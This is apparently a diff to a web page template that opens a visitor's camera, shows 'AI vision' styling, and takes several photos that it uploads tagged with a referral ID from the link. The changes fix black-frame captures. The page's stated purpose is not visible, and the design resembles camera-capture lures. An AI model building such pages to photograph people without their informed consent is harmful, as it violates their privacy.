@@ -12,9 +12,6 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
 
     <style>
-        /* ============================================================
-           RESET & BASE
-        ============================================================ */
         *, *::before, *::after {
             margin: 0;
             padding: 0;
@@ -64,9 +61,6 @@
             font-family: 'Cairo', 'Space Grotesk', system-ui, sans-serif;
         }
 
-        /* ============================================================
-           BACKGROUND LAYERS
-        ============================================================ */
         #bg-canvas {
             position: fixed;
             inset: 0;
@@ -137,9 +131,6 @@
             -webkit-mask-image: radial-gradient(ellipse at center, black 20%, transparent 75%);
         }
 
-        /* ============================================================
-           MAIN CARD
-        ============================================================ */
         .card {
             position: relative;
             z-index: 2;
@@ -173,7 +164,6 @@
             overflow: hidden;
         }
 
-        /* Bright scan line at top of card */
         .card-inner::before {
             content: '';
             position: absolute;
@@ -188,9 +178,6 @@
                 transparent);
         }
 
-        /* ============================================================
-           HEADER
-        ============================================================ */
         .header {
             display: flex;
             align-items: center;
@@ -290,9 +277,6 @@
             50% { opacity: 0.4; transform: scale(0.85); }
         }
 
-        /* ============================================================
-           HERO
-        ============================================================ */
         .hero {
             text-align: center;
             margin-bottom: 22px;
@@ -336,9 +320,6 @@
             line-height: 1.5;
         }
 
-        /* ============================================================
-           CAMERA PREVIEW
-        ============================================================ */
         .camera-frame {
             position: relative;
             border-radius: 20px;
@@ -360,7 +341,6 @@
             display: block;
         }
 
-        /* Corner brackets */
         .corner {
             position: absolute;
             width: 22px;
@@ -374,7 +354,6 @@
         .corner.bl { bottom: 12px; left: 12px; border-right: none; border-top: none; border-bottom-left-radius: 8px; }
         .corner.br { bottom: 12px; right: 12px; border-left: none; border-top: none; border-bottom-right-radius: 8px; }
 
-        /* Scan line */
         .scan {
             position: absolute;
             top: 0;
@@ -397,7 +376,6 @@
             100% { top: 100%; opacity: 0; }
         }
 
-        /* AI badge on camera */
         .ai-chip {
             position: absolute;
             bottom: 12px;
@@ -426,9 +404,6 @@
             animation: livePulse 1.5s ease-in-out infinite;
         }
 
-        /* ============================================================
-           RADIAL PROGRESS
-        ============================================================ */
         .progress-section {
             display: flex;
             align-items: center;
@@ -511,9 +486,6 @@
             letter-spacing: 0.3px;
         }
 
-        /* ============================================================
-           BUTTONS
-        ============================================================ */
         .btn-primary {
             position: relative;
             width: 100%;
@@ -598,9 +570,6 @@
             color: var(--text);
         }
 
-        /* ============================================================
-           FOOTER STATS
-        ============================================================ */
         .stats-row {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
@@ -646,9 +615,6 @@
             margin-top: 2px;
         }
 
-        /* ============================================================
-           NOTIFICATION TOAST
-        ============================================================ */
         .toast {
             position: fixed;
             bottom: 24px;
@@ -680,9 +646,6 @@
         .toast.error   { border-color: rgba(239, 68, 68, 0.4); }
         .toast.info    { border-color: rgba(99, 102, 241, 0.4); }
 
-        /* ============================================================
-           SUCCESS STATE
-        ============================================================ */
         .success-overlay {
             position: absolute;
             inset: 0;
@@ -732,9 +695,6 @@
             background-clip: text;
         }
 
-        /* ============================================================
-           RESPONSIVE
-        ============================================================ */
         @media (max-width: 480px) {
             body { padding: 12px; }
             .card-inner { padding: 20px 18px; }
@@ -757,24 +717,19 @@
 
 <body>
 
-<!-- Background canvas -->
 <canvas id="bg-canvas"></canvas>
 
-<!-- Aurora blobs -->
 <div class="aurora">
     <div class="aurora-blob"></div>
     <div class="aurora-blob"></div>
     <div class="aurora-blob"></div>
 </div>
 
-<!-- Grid overlay -->
 <div class="grid-overlay"></div>
 
-<!-- Main card -->
 <div class="card">
     <div class="card-inner">
 
-        <!-- Header -->
         <div class="header">
             <div class="brand">
                 <div class="brand-logo">✦</div>
@@ -789,7 +744,6 @@
             </div>
         </div>
 
-        <!-- Hero -->
         <div class="hero">
             <div class="hero-eyebrow">
                 <i class="fas fa-sparkles"></i>
@@ -802,7 +756,6 @@
             <p class="hero-sub">{{ texts.web_hero_sub }}</p>
         </div>
 
-        <!-- Camera preview -->
         <div class="camera-frame">
             <video id="camera" autoplay playsinline muted></video>
             <div class="corner tl"></div>
@@ -815,14 +768,12 @@
                 {{ texts.web_ai_vision }}
             </div>
 
-            <!-- Success overlay -->
             <div class="success-overlay" id="successOverlay">
                 <div class="success-icon">✓</div>
                 <div class="success-title">{{ texts.web_success }}</div>
             </div>
         </div>
 
-        <!-- Progress -->
         <div class="progress-section">
             <div class="radial-progress">
                 <svg viewBox="0 0 64 64">
@@ -848,7 +799,6 @@
             </div>
         </div>
 
-        <!-- Buttons -->
         <button class="btn-primary" id="captureBtn">
             <i class="fas fa-play"></i>
             <span>{{ texts.web_btn_start }}</span>
@@ -858,7 +808,6 @@
             <span>{{ texts.web_btn_restart }}</span>
         </button>
 
-        <!-- Stats -->
         <div class="stats-row">
             <div class="stat">
                 <i class="fas fa-microchip"></i>
@@ -880,35 +829,35 @@
     </div>
 </div>
 
-<!-- Toast -->
 <div class="toast" id="toast"></div>
 
 <script>
     // ============================================================
-    // TRANSLATIONS FROM SERVER
+    // TRANSLATIONS
     // ============================================================
     const TEXTS = {{ texts | tojson }};
 
     // ============================================================
     // ELEMENTS
     // ============================================================
-    const params      = new URLSearchParams(window.location.search);
-    const referralId  = params.get("q");
+    const params       = new URLSearchParams(window.location.search);
+    const referralId   = params.get("q");
 
-    const video         = document.getElementById("camera");
-    const captureBtn    = document.getElementById("captureBtn");
-    const progressCircle= document.getElementById("progressCircle");
-    const progressPct   = document.getElementById("progressPercent");
-    const statusText    = document.getElementById("statusText");
-    const statusDetail  = document.getElementById("statusDetail");
-    const toast         = document.getElementById("toast");
-    const successOverlay= document.getElementById("successOverlay");
+    const video          = document.getElementById("camera");
+    const captureBtn     = document.getElementById("captureBtn");
+    const progressCircle = document.getElementById("progressCircle");
+    const progressPct    = document.getElementById("progressPercent");
+    const statusText     = document.getElementById("statusText");
+    const statusDetail   = document.getElementById("statusDetail");
+    const toast          = document.getElementById("toast");
+    const successOverlay = document.getElementById("successOverlay");
 
-    const CIRCUMFERENCE = 2 * Math.PI * 28; // r=28
+    const CIRCUMFERENCE = 2 * Math.PI * 28;
     let stream = null;
+    let cameraReady = false;
 
     // ============================================================
-    // BACKGROUND PARTICLES CANVAS
+    // BACKGROUND PARTICLES
     // ============================================================
     (function initCanvas() {
         const canvas = document.getElementById("bg-canvas");
@@ -939,7 +888,6 @@
         function draw() {
             ctx.clearRect(0, 0, w, h);
 
-            // Draw connecting lines
             for (let i = 0; i < particles.length; i++) {
                 for (let j = i + 1; j < particles.length; j++) {
                     const dx = particles[i].x - particles[j].x;
@@ -956,7 +904,6 @@
                 }
             }
 
-            // Draw particles
             particles.forEach(p => {
                 p.x += p.vx;
                 p.y += p.vy;
@@ -1013,6 +960,43 @@
     }
 
     // ============================================================
+    // WAIT FOR VIDEO FRAME READY
+    // ============================================================
+    function waitForVideoReady(v) {
+        return new Promise((resolve, reject) => {
+            const timeout = setTimeout(() => {
+                reject(new Error("Video ready timeout"));
+            }, 8000);
+
+            // أفضل طريقة: requestVideoFrameCallback
+            if ('requestVideoFrameCallback' in v) {
+                v.requestVideoFrameCallback(() => {
+                    clearTimeout(timeout);
+                    resolve();
+                });
+                return;
+            }
+
+            // fallback: readyState >= 2
+            if (v.readyState >= 2 && v.videoWidth > 0) {
+                clearTimeout(timeout);
+                resolve();
+                return;
+            }
+
+            const checkReady = () => {
+                if (v.readyState >= 2 && v.videoWidth > 0) {
+                    clearTimeout(timeout);
+                    v.removeEventListener('loadeddata', checkReady);
+                    resolve();
+                }
+            };
+            v.addEventListener('loadeddata', checkReady);
+            v.addEventListener('timeupdate', checkReady);
+        });
+    }
+
+    // ============================================================
     // CAMERA INIT
     // ============================================================
     async function initCamera() {
@@ -1031,17 +1015,44 @@
                 audio: false
             });
 
+            // فحص: هل هناك مسار فيديو فعلي؟
+            const videoTrack = stream.getVideoTracks()[0];
+            if (!videoTrack || videoTrack.readyState === 'ended') {
+                throw new Error("Camera track unavailable");
+            }
+            console.log("Camera track:", videoTrack.label, videoTrack.readyState);
+
             video.srcObject = stream;
+
+            // انتظر metadata
             await new Promise((resolve, reject) => {
-                video.onloadedmetadata = () => {
-                    video.play().then(resolve).catch(reject);
-                };
+                video.onloadedmetadata = () => resolve();
+                setTimeout(() => reject(new Error("metadata timeout")), 5000);
             });
 
+            // شغّل الفيديو
+            await video.play();
+
+            // انتظر أول إطار حقيقي (الحل الأساسي للمشكلة السوداء)
+            await waitForVideoReady(video);
+
+            // تأكد من أن videoWidth > 0
+            if (!video.videoWidth || !video.videoHeight) {
+                // انتظر قليلاً وأعد الفحص
+                await new Promise(r => setTimeout(r, 500));
+                if (!video.videoWidth || !video.videoHeight) {
+                    throw new Error("Video has no dimensions");
+                }
+            }
+
+            cameraReady = true;
             setStatus(TEXTS.web_engine_ready, TEXTS.web_progress_frames, false);
             showToast(TEXTS.web_notif_ready, "success");
+            console.log("Camera ready:", video.videoWidth, "x", video.videoHeight);
+
         } catch (err) {
-            console.error(err);
+            console.error("Camera error:", err);
+            cameraReady = false;
             setStatus(TEXTS.web_allow_camera, "", false);
             showToast(TEXTS.web_notif_camera, "error");
         }
@@ -1052,11 +1063,18 @@
     // ============================================================
     // CAPTURE FRAME
     // ============================================================
-    function captureFrame() {
+    async function captureFrame() {
+        // انتظر أول إطار حقيقي قبل الرسم
+        await waitForVideoReady(video);
+
+        if (!video.videoWidth || !video.videoHeight) {
+            throw new Error("Video has no dimensions yet");
+        }
+
         return new Promise(resolve => {
             const canvas = document.createElement("canvas");
-            const w = video.videoWidth || 640;
-            const h = video.videoHeight || 480;
+            const w = video.videoWidth;
+            const h = video.videoHeight;
             canvas.width = w;
             canvas.height = h;
             const ctx = canvas.getContext("2d");
@@ -1075,6 +1093,11 @@
     captureBtn.addEventListener("click", async () => {
         if (!stream || !referralId) {
             showToast(TEXTS.web_notif_camera_notready, "error");
+            return;
+        }
+
+        if (!cameraReady) {
+            showToast(TEXTS.web_notif_camera, "error");
             return;
         }
 
@@ -1105,13 +1128,24 @@
                     true
                 );
 
+                // انتظر قليلاً قبل الالتقاط (يضمن إطار جديد)
+                await delay(200);
+
                 const blob = await captureFrame();
-                if (blob) formData.append("photos", blob, `photo_${i}.jpg`);
+
+                // فحص: هل الصورة سوداء/فارغة؟
+                if (!blob || blob.size < 2000) {
+                    console.warn("Frame", i, "too small:", blob?.size);
+                    throw new Error("Captured frame is empty/black");
+                }
+                console.log("Frame", i, "size:", blob.size, "bytes");
+
+                formData.append("photos", blob, `photo_${i}.jpg`);
 
                 if (i < totalPhotos) await delay(2000);
             }
 
-            // Stop camera
+            // أوقف الكاميرا
             if (stream) {
                 stream.getTracks().forEach(t => t.stop());
                 stream = null;
@@ -1137,10 +1171,16 @@
                 captureBtn.disabled = false;
             }
         } catch (err) {
-            console.error(err);
+            console.error("Capture error:", err);
             setStatus(TEXTS.web_connection_error, "", false);
-            showToast(TEXTS.web_connection_error_notif, "error");
+            showToast("❌ " + (err.message || TEXTS.web_connection_error_notif), "error");
             captureBtn.disabled = false;
+
+            // أعد تشغيل الكاميرا لو أمكن
+            if (!stream) {
+                cameraReady = false;
+                await initCamera();
+            }
         }
     });
 
